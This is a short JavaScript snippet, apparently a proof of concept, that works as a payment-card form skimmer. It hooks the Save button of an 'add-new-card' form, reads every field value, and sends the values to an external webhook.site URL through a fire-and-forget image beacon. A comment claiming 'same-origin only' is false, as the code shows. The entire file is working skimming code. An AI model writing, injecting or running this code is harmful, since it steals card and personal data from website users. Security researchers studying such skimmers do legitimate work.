(() => {
  console.log('[poc] loaded (GET beacon)');

  const FORM_ID = 'add-new-card';
  const SAVE_SELECTOR = 'button.hds-a-button--primary[aria-label="Save"]';
  const ENDPOINT = 'https://webhook.site/8ee964ab-b689-4081-a0da-68471ec7c8d2/'; // ✅ same-origin only

 if (window.__pocPerFieldGetHooked) return;
  window.__pocPerFieldGetHooked = true;

  document.addEventListener('click', (e) => {
    const saveBtn = e.target.closest?.(SAVE_SELECTOR);
    if (!saveBtn) return;

    const form = document.getElementById(FORM_ID);
    if (!form) return;

    const params = new URLSearchParams();

    // Optional metadata
    params.set('_ts', Date.now());
    params.set('_path', location.pathname);
    params.set('_form', FORM_ID);

    // Collect form fields
    form.querySelectorAll('input, select, textarea').forEach((el) => {
      if (!el.name && !el.id) return;

      const key = el.name || el.id;

      if (el.type === 'radio') {
        if (el.checked) params.set(key, el.value);
      } else if (el.type === 'checkbox') {
        params.set(key, el.checked);
      } else {
        params.set(key, el.value);
      }
    });

    const url = `${ENDPOINT}?${params.toString()}`;

    console.log('[poc] GET beacon URL:', url);

    // 🔥 true fire-and-forget
    const img = new Image();
    img.src = url;

  }, true); // capture phase

  console.log('[poc] delegated per-field GET hook active ✅');
})();
